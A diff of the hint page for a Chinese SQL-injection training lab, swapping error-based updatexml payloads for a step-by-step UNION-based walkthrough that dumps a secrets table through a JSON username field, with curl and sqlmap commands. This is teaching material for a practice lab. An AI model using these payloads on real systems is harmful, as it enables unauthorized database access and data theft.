@@ -1,25 +1,44 @@
 <div class="hint-thought">
 <h4>思路提示</h4>
-<p>本关的注入点在 JSON 请求体的 <code>username</code> 字段里。页面提供了一个 JSON 编辑框，点击「提交查询」会用 <code>XMLHttpRequest</code> 以 <code>Content-Type: application/json</code> 发送。你也可以用 Burp / curl / Postman 直接发原始 JSON。核心思路：单引号闭合 + 报错函数带出数据。</p>
+<p>本关注入点在 JSON 请求体的 <code>username</code> 字段里。页面提供 JSON 编辑框，点击「提交查询」会以 <code>Content-Type: application/json</code> 发送；也可用 Burp / curl / Postman 直接发原始 JSON。核心思路：单引号闭合 → 用 <code>UNION SELECT</code> 补齐 3 列 → 把要查的数据放到回显位。</p>
 </div>
 <details class="hint-detail">
 <summary>详细解题过程（点击展开）</summary>
 <div>
-<b>1. 确认注入点：</b>把 <code>username</code> 改成 <code>admin'</code>，提交后页面出现 MySQL 语法错误，说明单引号未过滤、报错回显开启。<br>
-<b>2. 闭合 + 注释：</b><code>{"username":"admin' -- -"}</code>，不再报错，确认闭合方式为单引号。<br>
-<b>3. 报错注入读版本：</b><br>
-<code>{"username":"' or updatexml(1,concat(0x7e,version()),1)-- -"}</code><br>
-报错中出现 MySQL 版本号即证明注入成功。<br>
-<b>4. 读通关凭证：</b><br>
-<code>{"username":"' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}</code><br>
-<b>5. extractvalue 备选：</b><br>
-<code>{"username":"' or extractvalue(1,concat(0x7e,(select secret from secrets limit 1)))-- -"}</code><br>
-<b>6. 分段读取（报错约 32 字节截断）：</b><br>
-<code>{"username":"' or updatexml(1,concat(0x7e,substr((select secret from secrets limit 1),1,20)),1)-- -"}</code><br>
-<b>7. curl 命令行验证：</b><br>
-<code>curl -X POST {{SITE}}/modules/sqli/json.php -H "Content-Type: application/json" -d '{"username":"'\'' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}'</code><br>
-<b>8. sqlmap 自动化：</b><br>
-<code>sqlmap -u "{{SITE}}/modules/sqli/json.php" --data '{"username":"admin"}' -p username --technique=E -D bafanglab -T secrets --dump --batch</code><br>
-<b>小提示：</b>JSON 字符串里的双引号要转义成 <code>\"</code>，单引号无需转义；浏览器地址栏里 <code>#</code> 会被当锚点，所以优先用 <code>-- -</code> 注释。
+<b>1. 确认注入点（单引号）：</b><br>
+<code>{"username":"admin'"}</code><br>
+提交后返回 MySQL 语法错误，说明单引号未过滤。<br><br>
+
+<b>2. 确认闭合与注释：</b><br>
+<code>{"username":"admin' -- -"}</code><br>
+不再报错，说明可以用 <code>'</code> 闭合、<code>-- -</code> 注释掉后面的引号。<br><br>
+
+<b>3. 测字段数量：</b>原查询是 <code>SELECT id, username, role FROM users WHERE username = '$name'</code>，共 3 列。<br>
+<code>{"username":"admin' union select 1,1,1 -- -"}</code><br>
+结果表格里多出一行 <code>1 | 1 | 1</code>，说明 3 列全部对得上；改成 <code>1,1,1,1</code> 会报「列数不一致」错误。<br><br>
+
+<b>4. 定位回显位（拿库名）：</b><br>
+<code>{"username":"admin' union select 1,1,database() -- -"}</code><br>
+第三列显示 <code>bafanglab</code> —— 第 3 个字段就是回显位。<br><br>
+
+<b>5. 拿表名：</b><br>
+<code>{"username":"admin' union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) -- -"}</code><br>
+第三列返回 <code>users,comments,secrets</code>。<br><br>
+
+<b>6. 拿列名：</b>把 <code>table_name</code> 换成 <code>column_name</code>，条件补上表名：<br>
+<code>{"username":"admin' union select 1,1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secrets') -- -"}</code><br>
+返回 <code>id,secret,note</code>。<br><br>
+
+<b>7. 拿数据（通关凭证）：</b><br>
+<code>{"username":"admin' union select 1,1,(select secret from secrets limit 0,1) -- -"}</code><br>
+第三列直接显示通关凭证。<br>
+<b>注意：</b>如果写成 <code>(select secret from secrets)</code> 不带 <code>limit</code>，会报 <code>MySQL 错误：Subquery returns more than 1 row</code>（secrets 表有多行）。这是 UNION 注入里最常见的坑：加 <code>limit 0,1</code> 限定一行，或用 <code>group_concat()</code> 合并多行即可。<br><br>
+
+<b>8. curl 命令行验证：</b><br>
+<code>curl -X POST {{SITE}}/modules/sqli/json.php -H "Content-Type: application/json" -d '{"username":"admin'\'' union select 1,1,(select secret from secrets limit 0,1) -- -"}'</code><br><br>
+
+<b>9. sqlmap 自动化（只跑 UNION 技术）：</b><br>
+<code>sqlmap -u "{{SITE}}/modules/sqli/json.php" --data '{"username":"admin"}' -p username --technique=U -D bafanglab -T secrets --dump --batch</code><br>
+<b>小提示：</b>JSON 字符串里的双引号要转义成 <code>\"</code>，单引号无需转义；<code>-- -</code> 后面的空格必须保留，否则注释不生效。
 </div>
 </details>
